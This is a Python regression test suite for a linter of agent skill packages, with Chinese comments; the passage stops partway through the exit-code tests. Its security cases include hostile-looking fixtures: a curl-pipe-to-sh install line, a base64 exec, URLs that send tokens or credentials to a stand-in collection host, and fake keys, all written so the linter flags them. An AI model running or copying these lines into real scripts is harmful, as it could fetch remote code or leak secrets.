"""lint 模块回归测试。

**本文件的两类价值**：
1. **用例矩阵**：每个规则至少一条触发用例与一条不触发用例（避免"只测了会 FAIL 的路径"）。
2. **假阳性回归**：把旧体系踩过的坑固化成用例——这些坑的共同后果是"工具开始骗人"，
   比漏报更致命。每条都在注释里写明来源。

**全局不变量**（比逐条断言更强的性质）：
- `run_rule_coverage`：42 条规则在任何一次运行中都必须产生记录；缺失即"实现遗漏"。
- 每个用例额外断言"**没有预期之外的 FAIL**"——防止改动一处、别处悄悄开始误报。

用法：
    python -m tests.test_lint            # 离线运行（脚本契约实测用例会自行构造脚本）
    python -m tests.test_lint --dogfood  # 额外对本仓库 legacy/ 下 4 个技能跑一遍并打印摘要
"""

from __future__ import annotations

import contextlib
import io
import json


import argparse
import os
import shutil
import subprocess
import sys
import tempfile
from dataclasses import dataclass, field
from pathlib import Path

if __package__ in (None, ""):  # 允许 `python tests/test_lint.py` 直接运行
    sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from skillverify.encoding import force_utf8_stdio  # noqa: E402
from skillverify.lint import RULES, lint_skill  # noqa: E402
from skillverify.report import FAIL, INFO, PASS, SKIP, WARN  # noqa: E402

_passed: list[str] = []
_failed: list[str] = []


def ok(msg: str) -> None:
    _passed.append(msg)
    print(f"  PASS {msg}")


def fail(msg: str) -> None:
    _failed.append(msg)
    print(f"  FAIL {msg}")


def check(cond: bool, msg: str) -> None:
    ok(msg) if cond else fail(msg)


# --------------------------------------------------------------------------- #
# 夹具
# --------------------------------------------------------------------------- #

DESC = "A demo skill used by the lint regression suite. Use when testing the linter."


def skill_md(body: str = "# Demo\n\nNothing to see here.\n",
             name: str = "demo-skill",
             frontmatter_extra: str = "") -> str:
    return (
        "---\n"
        f"name: {name}\n"
        f"description: {DESC}\n"
        f"{frontmatter_extra}"
        "---\n\n"
        f"{body}"
    )


@dataclass
class Case:
    name: str
    dirname: str
    files: dict[str, object]  # 相对路径 -> str（文本）或 bytes（原始字节）
    expect: dict[str, str] = field(default_factory=dict)
    run_scripts: bool = False
    script_timeout: float = 5.0

    def build(self, root: Path) -> Path:
        target = root / self.name / self.dirname
        target.mkdir(parents=True, exist_ok=True)
        for rel, content in self.files.items():
            path = target / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            if isinstance(content, bytes):
                path.write_bytes(content)
            else:
                path.write_text(content, encoding="utf-8", newline="")
        return target


#: 干净的基线：正文 + 一个存在的引用文件
CLEAN: dict[str, object] = {
    "SKILL.md": skill_md("# Demo\n\nRead `references/guide.md` for details.\n"),
    "references/guide.md": "# Guide\n\nDetails.\n",
}


def _clean(**overrides: object) -> dict[str, object]:
    files = dict(CLEAN)
    files.update(overrides)
    return files


CASES: list[Case] = [
    # ---------------- 基线 ----------------
    Case("clean", "demo-skill", _clean()),

    # ---------------- BUDGET ----------------
    Case("budget_official_lines", "demo-skill",
         _clean(**{"SKILL.md": skill_md("# Demo\n" + "line\n" * 520)}),
         {"BUDGET-001": WARN, "BUDGET-003": PASS}),
    Case("budget_house_hard_line", "demo-skill",
         _clean(**{"SKILL.md": skill_md("# Demo\n" + "line\n" * 820)}),
         {"BUDGET-001": WARN, "BUDGET-003": FAIL}),
    Case("budget_tokens", "demo-skill",
         _clean(**{"SKILL.md": skill_md("# Demo\n" + ("word " * 5000))}),
         {"BUDGET-002": WARN}),
    Case("budget_reference_too_long", "demo-skill",
         _clean(**{"references/big.md": "x\n" * 600}),
         {"BUDGET-004": WARN}),
    Case("budget_reference_ok", "demo-skill", _clean(), {"BUDGET-004": PASS}),
    Case("body_empty", "demo-skill",
         {"SKILL.md": skill_md("")},
         {"BODY-001": WARN, "REF-001": INFO, "REF-002": INFO}),

    # ---------------- REF ----------------
    Case("ref_broken_prose", "demo-skill",
         _clean(**{"SKILL.md": skill_md("# Demo\n\nSee `references/missing.md`.\n")}),
         {"REF-001": FAIL}),
    Case("ref_broken_in_fence", "demo-skill",
         _clean(**{"SKILL.md": skill_md(
             "# Demo\n\n```bash\npython scripts/example.py\n```\n")}),
         {"REF-001": INFO, "REF-002": WARN}),
    Case("ref_case_mismatch", "demo-skill",
         _clean(**{"SKILL.md": skill_md("# Demo\n\nSee `references/Guide.md`.\n")}),
         {"REF-001": WARN}),
    Case("ref_host_path", "demo-skill",
         _clean(**{"SKILL.md": skill_md("# Demo\n\n见 `~/.agents/skills/x/SKILL.md`。\n")}),
         {"REF-003": FAIL}),
    Case("ref_host_path_drive", "demo-skill",
         _clean(**{"references/guide.md": "Path: C:\\Users\\me\\skills\\x.md\n"}),
         {"REF-003": FAIL}),
    Case("ref_url_not_host_path", "demo-skill",
         _clean(**{"references/guide.md": "See https://agentskills.io/specification for more.\n"}),
         {"REF-003": PASS}),
    Case("ref_absolute_to_package_file", "demo-skill",
         _clean(**{"SKILL.md": skill_md(
             "# Demo\n\nSee `/home/me/skills/demo-skill/references/guide.md`.\n")}),
         {"REF-004": WARN}),
    Case("ref_two_level_chain", "demo-skill",
         _clean(**{"SKILL.md": skill_md("# Demo\n\nSee `references/a.md`.\n"),
                   "references/a.md": "See `references/b.md`.\n",
                   "references/b.md": "# B\n"}),
         {"REF-005": WARN}),
    Case("ref_deep_path", "demo-skill",
         _clean(**{"SKILL.md": skill_md("# Demo\n\nSee `references/sub/x.md`.\n"),
                   "references/sub/x.md": "# X\n"}),
         {"REF-005": WARN}),
    Case("ref_vague_pointer", "demo-skill",
         _clean(**{"SKILL.md": skill_md("# Demo\n\n需要更多细节时详见 references/ 目录。\n")}),
         {"REF-006": WARN}),
    Case("ref_named_pointer_ok", "demo-skill",
         _clean(**{"SKILL.md": skill_md("# Demo\n\nAPI 返回非 200 时读 references/guide.md。\n")}),
         {"REF-006": PASS}),
    Case("ref_script_not_listed", "demo-skill",
         _clean(**{"scripts/tool.py": "print('hi')\n"}),
         {"REF-007": WARN}),
    Case("ref_script_listed", "demo-skill",
         _clean(**{"SKILL.md": skill_md(
             "# Demo\n\n- `scripts/tool.py` — prints hi\n\nRead `references/guide.md`.\n"),
             "scripts/tool.py": "print('hi')\n"}),
         {"REF-007": PASS}),

    # ---------------- HYG ----------------
    Case("hyg_nonstandard_dir", "demo-skill",
         _clean(**{"docs/notes.md": "# Notes\n"}),
         {"HYG-001": WARN}),
    Case("hyg_junk_untracked", "demo-skill",
         _clean(**{"__pycache__/mod.cpython-313.pyc": b"\x00\x01\x02junk"}),
         {"HYG-002": WARN}),
    Case("hyg_unknown_ext", "demo-skill",
         _clean(**{"references/data.parquet": b"\x00binary"}),
         {"HYG-003": WARN, "HYG-005": PASS}),
    Case("hyg_asset_misplaced", "demo-skill",
         _clean(**{"references/logo.png": b"\x89PNG\x00\x00"}),
         {"HYG-005": WARN}),
    Case("hyg_asset_in_assets", "demo-skill",
         _clean(**{"assets/logo.png": b"\x89PNG\x00\x00"}),
         {"HYG-005": PASS}),
    Case("hyg_eval_input_file_ok", "demo-skill",
         _clean(**{"evals/files/input.csv": "month,revenue\n"},
                **{"evals/evals.json": '{"skill_name": "demo-skill", "evals": []}\n'}),
         {"HYG-005": PASS}),

    # ---------------- ENC ----------------
    Case("enc_shell_crlf", "demo-skill",
         _clean(**{"scripts/run.sh": b"#!/bin/bash\r\necho hi\r\n"}),
         {"ENC-001": FAIL, "ENC-002": PASS}),
    Case("enc_py_crlf", "demo-skill",
         _clean(**{"scripts/tool.py": b"print('hi')\r\n"}),
         {"ENC-001": PASS, "ENC-002": WARN}),
    Case("enc_bom", "demo-skill",
         {"SKILL.md": b"\xef\xbb\xbf" + skill_md().encode("utf-8")},
         {"ENC-003": WARN}),
    Case("enc_not_utf8", "demo-skill",
         {"SKILL.md": skill_md().encode("utf-8"),
          "references/gbk.md": "中文说明\n".encode("gbk")},
         {"ENC-004": FAIL}),

    # ---------------- I18N ----------------
    Case("i18n_command_with_cjk", "demo-skill",
         _clean(**{"SKILL.md": skill_md(
             "# Demo\n\n```bash\npip install 依赖包\n````\n")}),
         {"I18N-001": WARN}),
    Case("i18n_chinese_comment_ok", "demo-skill",
         _clean(**{"SKILL.md": skill_md(
             "# Demo\n\n```bash\npip install requests  # 安装依赖\n```\n")}),
         {"I18N-001": PASS, "DEP-001": WARN}),

    # ---------------- SCRIPT（静态） ----------------
    Case("script_syntax_error", "demo-skill",
         _clean(**{"scripts/broken.py": "def f(:\n    pass\n"}),
         {"SCRIPT-001": FAIL}),
    Case("script_py2_skipped", "demo-skill",
         _clean(**{"scripts/old.py": "#!/usr/bin/env python2\nprint 'hi'\n"}),
         {"SCRIPT-001": PASS}),
    Case("script_input_call", "demo-skill",
         _clean(**{"scripts/ask.py": "name = input('Your name: ')\nprint(name)\n"}),
         {"SCRIPT-002": FAIL}),
    Case("script_input_in_docstring_ok", "demo-skill",
         _clean(**{"scripts/ok.py": '"""Usage: input(argv) is not a prompt."""\nprint(1)\n'}),
         {"SCRIPT-002": PASS}),
    Case("script_my_input_ok", "demo-skill",
         _clean(**{"scripts/ok.py": "def my_input(x):\n    return x\n\nprint(my_input(1))\n"}),
         {"SCRIPT-002": PASS}),
    Case("script_shell_prompt", "demo-skill",
         _clean(**{"scripts/ask.sh": "#!/bin/bash\nread -p 'Name: ' name\necho $name\n"}),
         {"SCRIPT-002": FAIL}),
    Case("script_shell_plain_read_ok", "demo-skill",
         _clean(**{"scripts/pipe.sh": "#!/bin/bash\nwhile read -r line; do echo $line; done\n"}),
         {"SCRIPT-002": PASS}),
    Case("script_no_parser", "demo-skill",
         _clean(**{"scripts/plain.py": "print('just prints something')\n"}),
         {"SCRIPT-003": WARN}),
    Case("script_manual_argv_help", "demo-skill",
         _clean(**{"scripts/manual.py":
                   "import sys\n\n"
                   "def show_help():\n    print('usage: manual.py <path>')\n\n"
                   "if len(sys.argv) < 2 or sys.argv[1] in ('-h', '--help'):\n"
                   "    show_help()\n    raise SystemExit(0)\n"}),
         {"SCRIPT-003": PASS}),
    Case("script_destructive_no_guard", "demo-skill",
         _clean(**{"scripts/clean.py":
                   "import shutil\n\nshutil.rmtree('/tmp/out')\n"}),
         {"SCRIPT-005": WARN}),
    Case("script_destructive_with_guard", "demo-skill",
         _clean(**{"scripts/clean.py":
                   "import argparse, shutil\n\n"
                   "p = argparse.ArgumentParser()\n"
                   "p.add_argument('--dry-run', action='store_true')\n"
                   "a = p.parse_args()\n"
                   "if not a.dry_run:\n    shutil.rmtree('/tmp/out')\n"}),
         {"SCRIPT-005": PASS, "SCRIPT-003": PASS}),
    Case("script_guard_in_comment_only", "demo-skill",
         _clean(**{"scripts/clean.py":
                   "# 支持 --dry-run（其实并没有实现）\n"
                   "import shutil\n\nshutil.rmtree('/tmp/out')\n"}),
         {"SCRIPT-005": WARN}),

    # ---------------- DEP ----------------
    Case("dep_unpinned_in_code", "demo-skill",
         _clean(**{"scripts/pin.sh": "#!/bin/bash\npip install requests\n"}),
         {"DEP-001": FAIL}),
    Case("dep_unpinned_in_doc", "demo-skill",
         _clean(**{"SKILL.md": skill_md("# Demo\n\n```bash\nnpx eslint .\n```\n")}),
         {"DEP-001": WARN}),
    Case("dep_pinned_ok", "demo-skill",
         _clean(**{"SKILL.md": skill_md("# Demo\n\n```bash\nnpx eslint@9.0.0 .\n```\n")}),
         {"DEP-001": PASS}),
    Case("dep_dist_tag_is_ranged", "demo-skill",
         _clean(**{"SKILL.md": skill_md("# Demo\n\n```bash\nnpx eslint@latest .\n```\n")}),
         {"DEP-001": WARN}),
    Case("dep_value_flag_not_a_package", "demo-skill",
         _clean(**{"scripts/install.sh":
                   "#!/bin/bash\npip install -r requirements.txt\n",
                   "requirements.txt": "requests==2.31.0\n"}),
         {"DEP-001": INFO, "DEP-003": FAIL}),
    Case("dep_go_run_local_ok", "demo-skill",
         _clean(**{"scripts/build.sh": "#!/bin/bash\ngo run .\n"}),
         {"DEP-001": INFO}),
    Case("dep_runner_mentioned_in_prose", "demo-skill",
         _clean(**{"references/notes.md":
                   "运行器选择（uvx/pipx/npx/bunx/deno/go run）是否与目标环境匹配；\n"}),
         {"DEP-001": INFO}),
    Case("dep_third_party_undeclared", "demo-skill",
         _clean(**{"scripts/fetch.py": "import requests\n\nprint(requests.get('https://example.com'))\n"}),
         {"DEP-002": WARN}),
    Case("dep_third_party_declared_inline", "demo-skill",
         _clean(**{"scripts/fetch.py":
                   "# /// script\n# dependencies = [\"requests==2.31.0\"]\n# requires-python = \">=3.10\"\n# ///\n"
                   "import requests\n\nprint(requests.get('https://example.com'))\n"}),
         {"DEP-002": PASS, "DEP-004": PASS}),
    Case("dep_third_party_documented", "demo-skill",
         _clean(**{"SKILL.md": skill_md(
             "# Demo\n\n需要预先 `pip install requests==2.31.0`。\n"),
             "scripts/fetch.py": "import requests\n\nprint(requests)\n"}),
         {"DEP-002": PASS}),
    Case("dep_inline_loose_version", "demo-skill",
         _clean(**{"scripts/fetch.py":
                   "# /// script\n# dependencies = [\"requests\"]\n# ///\n"
                   "import requests\n\nprint(requests)\n"}),
         {"DEP-002": PASS, "DEP-004": WARN}),
    Case("dep_import_alias_resolved", "demo-skill",
         _clean(**{"scripts/img.py":
                   "# /// script\n# dependencies = [\"Pillow==10.0.0\"]\n"
                   "# requires-python = \">=3.10\"\n# ///\n"
                   "from PIL import Image\n\nprint(Image)\n"}),
         {"DEP-002": PASS, "DEP-004": PASS}),
    Case("dep_manifest", "demo-skill",
         _clean(**{"package.json": "{}\n"}),
         {"DEP-003": FAIL}),
    Case("dep_manifest_in_fixture", "demo-skill",
         _clean(**{"references/package.json": "{}\n"}),
         {"DEP-003": WARN}),

    # ---------------- SEC ----------------
    Case("sec_aws_key", "demo-skill",
         _clean(**{"references/creds.md": "key = AKIAIOSFODNN7REALKEY\n"}),
         {"SEC-001": FAIL}),
    Case("sec_aws_example_denoised", "demo-skill",
         _clean(**{"references/creds.md": "key = AKIAIOSFODNN7EXAMPLE\n"}),
         {"SEC-001": PASS}),
    Case("sec_private_key", "demo-skill",
         _clean(**{"references/k.pem": "-----BEGIN RSA PRIVATE KEY-----\nMIIE\n"}),
         {"SEC-001": FAIL}),
    Case("sec_generic_assignment", "demo-skill",
         _clean(**{"references/cfg.md": 'api_key = "a8f3k2m9x7q1z5w0"\n'}),
         {"SEC-002": WARN, "SEC-003": PASS}),
    Case("sec_entropy", "demo-skill",
         _clean(**{"references/blob.txt": "token: aB3kL9mQ2xZ7pR4tY8wV5nC1sD6gH0jK\n"}),
         {"SEC-003": WARN}),
    Case("sec_hex_digest_ok", "demo-skill",
         _clean(**{"references/hash.txt":
                   "sha256: 3f786850e387550fdab836ed7e6dc881de23001b4c2b3d0c65d3a2b7cb1f0a55\n"}),
         {"SEC-001": PASS, "SEC-003": PASS}),
    Case("sec_download_exec", "demo-skill",
         _clean(**{"scripts/install.sh": "#!/bin/bash\ncurl -fsSL https://example.com/i.sh | sh\n"}),
         {"SEC-004": WARN}),
    Case("sec_obfuscation", "demo-skill",
         _clean(**{"scripts/run.py":
                   "import base64\nexec(base64.b64decode('cHJpbnQoMSk=').decode())\n"}),
         {"SEC-005": WARN}),
    Case("sec_exfil_url", "demo-skill",
         _clean(**{"scripts/send.py":
                   "import urllib.request\n"
                   "urllib.request.urlopen('https://collect.example.net/p?token=abc123')\n"}),
         {"SEC-006": WARN, "SEC-007": WARN}),
    Case("sec_exfil_userinfo", "demo-skill",
         _clean(**{"scripts/send.py":
                   "import urllib.request\n"
                   "urllib.request.urlopen('https://admin:hunter2@collect.example.net/data')\n"}),
         {"SEC-006": WARN, "SEC-007": WARN}),
    Case("sec_exfil_not_port", "demo-skill",
         # 控制组：`host:port` 不是凭据，不得误报
         _clean(**{"scripts/send.py":
                   "import urllib.request\n"
                   "urllib.request.urlopen('https://collect.example.net:8443/data')\n"}),
         {"SEC-006": PASS}),
    Case("sec_undeclared_endpoint", "demo-skill",
         _clean(**{"scripts/api.py":
                   "import urllib.request\nurllib.request.urlopen('https://internal.corp/api')\n"}),
         {"SEC-007": WARN}),
    Case("sec_declared_endpoint_ok", "demo-skill",
         _clean(**{"SKILL.md": skill_md(
             "# Demo\n\nRead `references/guide.md`.\n",
             frontmatter_extra="compatibility: Requires network access to internal.corp\n"),
             "scripts/api.py":
                   "import urllib.request\nurllib.request.urlopen('https://internal.corp/api')\n"}),
         {"SEC-007": PASS}),
]


# --------------------------------------------------------------------------- #
# 用例矩阵
# --------------------------------------------------------------------------- #


def status_of(report, rid: str) -> str | None:
    for res in report.results:
        if res.rid == rid:
            return res.status
    return None


def run_case_matrix(tmp: Path) -> None:
    print("[test_case_matrix]")
    for case in CASES:
        target = case.build(tmp)
        report = lint_skill(target, run_scripts=case.run_scripts,
                            script_timeout_s=case.script_timeout)
        problems: list[str] = []
        for rid, want in case.expect.items():
            got = status_of(report, rid)
            if got != want:
                problems.append(f"{rid} 期望 {want} 实得 {got}")
        unexpected = sorted(
            r.rid for r in report.results if r.status == FAIL and case.expect.get(r.rid) != FAIL
        )
        if unexpected:
            problems.append(f"预期之外的 FAIL: {unexpected}")
        if problems:
            fail(f"{case.name}: " + "；".join(problems))
        else:
            ok(f"{case.name}: {len(case.expect)} 项判定符合预期，无意外 FAIL")


# --------------------------------------------------------------------------- #
# 规则覆盖不变量
# --------------------------------------------------------------------------- #


def run_rule_coverage(tmp: Path) -> None:
    print("[test_rule_coverage]")
    for name, files in (("clean", _clean()),
                        ("empty-skill", {"SKILL.md": skill_md("")}),
                        ("no-scripts", _clean(**{"SKILL.md": skill_md("# X\n")}))):
        target = tmp / "coverage" / name / "demo-skill"
        target.mkdir(parents=True, exist_ok=True)
        for rel, content in files.items():
            path = target / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(content if isinstance(content, str) else content.decode("utf-8", "replace"),
                            encoding="utf-8", newline="")
        report = lint_skill(target)
        reported = {r.rid for r in report.results}
        missing = sorted(set(RULES) - reported)
        if missing:
            fail(f"{name}: {len(missing)} 条规则未产生记录: {missing}")
        else:
            ok(f"{name}: 全部 {len(RULES)} 条规则均产生记录")

    # 前置失败时：全部记 SKIP，且不得出现任何 PASS（"没报就是过"的反面）
    broken = tmp / "coverage" / "no-skill-md" / "demo-skill"
    broken.mkdir(parents=True, exist_ok=True)
    report = lint_skill(broken)
    statuses = {r.status for r in report.results}
    if statuses == {SKIP} and len(report.results) == len(RULES):
        ok("SKILL.md 缺失：全部规则记 SKIP，零假 PASS")
    else:
        fail(f"前置失败处理异常: statuses={statuses} n={len(report.results)}")


# --------------------------------------------------------------------------- #
# 假阳性回归（旧体系已踩过的坑）
# --------------------------------------------------------------------------- #


def run_regressions(tmp: Path) -> None:
    print("[test_regressions]")

    # 1. 密钥证据必须脱敏（旧体系把密钥原文写进了落盘报告）
    d = tmp / "reg_mask" / "demo-skill"
    d.mkdir(parents=True, exist_ok=True)
    secret = "AKIAIOSFODNN7REALKEY"
    (d / "SKILL.md").write_text(skill_md(), encoding="utf-8", newline="")
    (d / "references").mkdir(exist_ok=True)
    (d / "references/c.md").write_text(f"key = {secret}\n", encoding="utf-8", newline="")
    report = lint_skill(d)
    evidence = " ".join(r.evidence for r in report.results if r.rid == "SEC-001")
    check(secret not in evidence and "AKIA…" in evidence or "AKIA" in evidence and secret not in evidence,
          f"密钥证据已脱敏（{evidence[:60]}）")

    # 2. 文档字符串里的 `# /// script` 不算 PEP 723 声明
    d2 = tmp / "reg_pep723" / "demo-skill"
    d2.mkdir(parents=True, exist_ok=True)
    (d2 / "SKILL.md").write_text(skill_md(), encoding="utf-8", newline="")
    (d2 / "scripts").mkdir(exist_ok=True)
    (d2 / "scripts/f.py").write_text(
        '"""\n# /// script\n# dependencies = ["requests==2.31.0"]\n# ///\n"""\n'
        "import requests\n\nprint(requests)\n",
        encoding="utf-8", newline="")
    report2 = lint_skill(d2)
    check(status_of(report2, "DEP-004") == INFO,
          "文档字符串中的 `# /// script` 不被当作内联声明")

    # 3. PEP 723 单引号写法必须被识别（旧体系漏检导致假 WARN）
    d3 = tmp / "reg_pep723_quotes" / "demo-skill"
    d3.mkdir(parents=True, exist_ok=True)
    (d3 / "SKILL.md").write_text(skill_md(), encoding="utf-8", newline="")
    (d3 / "scripts").mkdir(exist_ok=True)
    (d3 / "scripts/f.py").write_text(
        "# /// script\n# dependencies = ['requests==2.31.0']\n"
        "# requires-python = '>=3.10'\n# ///\nimport requests\n\nprint(requests)\n",
        encoding="utf-8", newline="")
    report3 = lint_skill(d3)
    check(status_of(report3, "DEP-002") == PASS and status_of(report3, "DEP-004") == PASS,
          "PEP 723 单引号写法被正确识别")

    # 4. `read`（无 -p）读 stdin 是官方允许的，不得误报
    d4 = tmp / "reg_read" / "demo-skill"
    d4.mkdir(parents=True, exist_ok=True)
    (d4 / "SKILL.md").write_text(skill_md(), encoding="utf-8", newline="")
    (d4 / "scripts").mkdir(exist_ok=True)
    (d4 / "scripts/p.sh").write_text(
        "#!/bin/bash\nread -r line\necho \"$line\"\n", encoding="utf-8", newline="")
    report4 = lint_skill(d4)
    check(status_of(report4, "SCRIPT-002") == PASS, "裸 read 不计为交互式阻塞")

    # 5. 行数计数不得把行尾换行算成额外一行
    d5 = tmp / "reg_lines" / "demo-skill"
    d5.mkdir(parents=True, exist_ok=True)
    (d5 / "SKILL.md").write_text(skill_md("# X\n"), encoding="utf-8", newline="")
    report5 = lint_skill(d5)
    budget = next(r for r in report5.results if r.rid == "BUDGET-001")
    declared = len((skill_md("# X\n")).splitlines())
    check(f"总行数 {declared}" in budget.evidence,
          f"行数计数无 off-by-one（期望 {declared}）")

    # 6. 符号链接不跟随（扫描范围不得蔓延到包外）
    d6 = tmp / "reg_symlink" / "demo-skill"
    d6.mkdir(parents=True, exist_ok=True)
    (d6 / "SKILL.md").write_text(skill_md(), encoding="utf-8", newline="")
    outside = tmp / "reg_symlink" / "outside.txt"
    outside.write_text("host path C:\\secret\\x\n", encoding="utf-8", newline="")
    try:
        (d6 / "linked.txt").symlink_to(outside)
        report6 = lint_skill(d6)
        check(status_of(report6, "REF-003") == PASS,
              "符号链接不被跟随（包外宿主路径未被扫描）")
    except (OSError, NotImplementedError):
        ok("符号链接用例跳过（当前环境不允许创建链接）")

    # 7. git 跟踪状态决定 HYG-002 级别（避免"本地缓存"常态化误报）
    if shutil.which("git"):
        d7 = tmp / "reg_git" / "demo-skill"
        (d7 / "__pycache__").mkdir(parents=True, exist_ok=True)
        (d7 / "SKILL.md").write_text(skill_md(), encoding="utf-8", newline="")
        (d7 / "scripts").mkdir(exist_ok=True)
        (d7 / "scripts/a.py").write_text("print(1)\n", encoding="utf-8", newline="")
        (d7 / "__pycache__/a.cpython-313.pyc").write_bytes(b"\x00junk")
        env = {"GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t", "PATH": str(Path(sys.executable).parent)}
        subprocess.run(["git", "init", "-q"], cwd=d7, capture_output=True)
        report7a = lint_skill(d7)
        check(status_of(report7a, "HYG-002") == WARN,
              "未被 git 跟踪的缓存文件记 WARN（不阻断）")
        subprocess.run(["git", "add", "-Af", "__pycache__"], cwd=d7, capture_output=True)
        report7b = lint_skill(d7)
        check(status_of(report7b, "HYG-002") == FAIL,
              "被 git 跟踪的缓存文件记 FAIL（会随包交付）")
    else:
        ok("git 相关用例跳过（未找到 git）")

    # 8. 依赖清单落在 references/ 下只记 WARN（样例/夹具）
    d8 = tmp / "reg_manifest_fixture" / "demo-skill"
    (d8 / "references").mkdir(parents=True, exist_ok=True)
    (d8 / "SKILL.md").write_text(skill_md(), encoding="utf-8", newline="")
    (d8 / "references/requirements.txt").write_text("requests==2.31.0\n",
                                                    encoding="utf-8", newline="")
    report8 = lint_skill(d8)
    check(status_of(report8, "DEP-003") == WARN, "references/ 下的依赖清单记 WARN 而非 FAIL")


# --------------------------------------------------------------------------- #
# 脚本契约实测（含"默认不执行"的安全性质）
# --------------------------------------------------------------------------- #

GOOD_SCRIPT = """\
import argparse
import sys


def main() -> int:
    parser = argparse.ArgumentParser(description="Demo tool.")
    parser.add_argument("--dry-run", action="store_true", help="preview only")
    parser.parse_args()
    return 0


if __name__ == "__main__":
    sys.exit(main())
"""

SLOPPY_SCRIPT = """\
import time

print("usage: sloppy")
print("generated at", time.time())
"""

#: 一个"没实现 --help"的脚本：它会忽略未知参数并直接执行主体动作。
#: 这个夹具是"为什么 --scripts 必须显式开启"的实证。
MARKER_SCRIPT = """\
import pathlib

pathlib.Path("side-effect-marker.txt").write_text("ran", encoding="utf-8")
"""


def _bare_skill(root: Path, name: str, files: dict[str, str]) -> Path:
    target = root / name / "demo-skill"
    (target / "scripts").mkdir(parents=True, exist_ok=True)
    (target / "SKILL.md").write_text(
        skill_md("# Demo\n\n- `scripts/" + list(files)[0].split("/")[-1] + "` — demo\n"),
        encoding="utf-8", newline="")
    for rel, content in files.items():
        (target / rel).write_text(content, encoding="utf-8", newline="")
    return target


def run_script_contracts(tmp: Path) -> None:
    print("[test_script_contracts]")

    # 默认不执行：即使脚本会写文件，静态 lint 也绝不能产生副作用
    target = _bare_skill(tmp / "dyn_default", "marker", {"scripts/mark.py": MARKER_SCRIPT})
    report = lint_skill(target)
    check(not (target / "side-effect-marker.txt").exists(),
          "默认（未开 --scripts）不执行任何脚本，零副作用")
    check(status_of(report, "SCRIPT-004") == SKIP,
          "有脚本但未开 --scripts 时记 SKIP（覆盖有洞，计入退出码 2）")

    # 开启后：会执行（并把副作用留在磁盘上——这正是必须显式开启的理由）
    report = lint_skill(target, run_scripts=True, script_timeout_s=10.0)
    check((target / "side-effect-marker.txt").exists(),
          "开启 --scripts 后确实执行了脚本（副作用可见，故默认关闭）")

    # 合格脚本：--help 可用、非法参数报错走 stderr、重复调用一致
    good = _bare_skill(tmp / "dyn_good", "good", {"scripts/tool.py": GOOD_SCRIPT})
    report = lint_skill(good, run_scripts=True, script_timeout_s=10.0)
    for rid in ("SCRIPT-004", "SCRIPT-006", "SCRIPT-007", "SCRIPT-008"):
        got = status_of(report, rid)
        check(got == PASS, f"合格脚本 {rid} == PASS（实得 {got}）")

    # 输出含时间戳 → 幂等 WARN
    sloppy = _bare_skill(tmp / "dyn_sloppy", "sloppy", {"scripts/tool.py": SLOPPY_SCRIPT})
    report = lint_skill(sloppy, run_scripts=True, script_timeout_s=10.0)
    check(status_of(report, "SCRIPT-007") == WARN,
          "两次 --help 输出不一致（时间戳）记 WARN")

    # 阻塞在 input() 的脚本：--help 会挂起 → 超时记 FAIL
    hang = _bare_skill(tmp / "dyn_hang", "hang",
                       {"scripts/hang.py": "name = input('Name: ')\nprint(name)\n"})
    report = lint_skill(hang, run_scripts=True, script_timeout_s=3.0)
    check(status_of(report, "SCRIPT-002") == FAIL and status_of(report, "SCRIPT-004") == FAIL,
          "input() 阻塞脚本：静态 FAIL + 实测超时 FAIL")


# --------------------------------------------------------------------------- #
# 退出码契约
# --------------------------------------------------------------------------- #


def run_optional_marking(tmp: Path) -> None:
    """「未开启的可选批次」必须靠 Result.optional 表达，而不是匹配证据文本。

    两条断言一起看才有意义：有脚本且没开 `--scripts` → 有 optional 的 SKIP + 提示；
    没有脚本 → 没有 optional 的 SKIP，也就**不该**出现那句提示
    （否则说明判定又回到了文本匹配）。
    """
    print("[test_optional_marking]")
    from skillverify import cli

    def run_cli(argv: list[str]) -> tuple[int, str, str]:
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            try:
                code = cli.main(argv)
            except SystemExit as exc:
                code = exc.code if isinstance(exc.code, int) else 1
        return code, out.getvalue(), err.getvalue()

    with_script = _bare_skill(tmp / "opt-a", "good", {"scripts/tool.py": GOOD_SCRIPT})
    code, _out, err = run_cli(["lint", str(with_script)])
    check(code == 2, f"未开 --scripts → 退出码 2（实得 {code}）")
    check("脚本契约实测未执行" in err, "有脚本时提示「脚本契约实测未执行」")

    _code2, out2, _err2 = run_cli(["lint", str(with_script), "--scripts", "--json"])
    skipped = [r for r in json.loads(out2)["results"]
               if r["status"] == "SKIP" and r.get("optional")]
    check(not skipped,
          f"开了 --scripts 就没有 optional 的 SKIP（实得 {[r['rid'] for r in skipped]}）")

    # 对照：一个**没有脚本**的技能（手工建，不要 scripts/ 目录）
    plain = tmp / "opt-b" / "plain-skill"
    plain.mkdir(parents=True)
    (plain / "SKILL.md").write_text(
        "---\nname: plain-skill\ndescription: A demo skill without any scripts.\n"
        "---\n\n# Plain\n\n没有脚本。\n", encoding="utf-8", newline="")
    _code3, _out3, err3 = run_cli(["lint", str(plain)])
    check("脚本契约实测未执行" not in err3,
          "没有脚本时不该出现「未执行」提示（说明判定不是按证据文本）")
    check(_code3 == 0, f"无脚本的技能 lint 通过（实得 {_code3}）")


def run_ts_script(tmp: Path) -> None:
    """TypeScript 不能交给 node 实测：那是拿工具的能力边界当技能的问题（假阳性）。"""
    print("[test_ts_script]")
    skill = _bare_skill(tmp / "ts-skill", "ts-skill", {
        "scripts/tool.ts": "export function main(): void {\n  console.log('hi');\n}\n",
    })
    report = lint_skill(skill, run_scripts=True)
    st = status_of(report, "SCRIPT-004")
    check(st == SKIP, f".ts 不做实测探测 → SCRIPT-004 记 SKIP（实得 {st}）")
    optional = next((r.optional for r in report.results if r.rid == "SCRIPT-004"), None)
    check(optional is True, "该 SKIP 标 optional（属「环境能力不足」，不计技能缺陷）")
    check(status_of(report, "SCRIPT-002") in (PASS, WARN),
          ".ts 的静态检查照做（交互式输入仍会被检）")


def run_exit_codes(tmp: Path) -> None:
    print("[test_exit_codes]")
    clean = tmp / "exit_clean" / "demo-skill"
    (clean / "references").mkdir(parents=True, exist_ok=True)
    (clean / "SKILL.md").write_text(
        skill_md("# Demo\n\nRead `references/guide.md` for details.\n"),
        encoding="utf-8", newline="")
    (clean / "references/guide.md").write_text("# Guide\n", encoding="utf-8", newline="")
